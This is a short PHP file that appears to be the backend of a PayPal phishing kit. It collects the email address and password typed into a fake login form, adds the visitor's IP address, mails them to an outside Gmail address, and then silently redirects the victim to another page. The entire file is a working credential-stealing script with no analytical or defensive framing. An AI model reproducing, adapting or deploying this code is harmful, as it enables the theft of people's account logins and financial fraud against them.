<?php

$ip = getenv("REMOTE_ADDR");
$message .= "Email : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['ps']."\n";
$message .= "User IP : ".$ip."\n";
$recipient = "hiredesksccch@gmail.com";
$subject = "PAYPAL | $ip";
$ip = getenv("REMOTE_ADDR");
mail($recipient,$subject,$message,$headers);?>





<script type="text/javascript">
</script><meta HTTP-EQUIV="REFRESH" content="0; url=reading.html">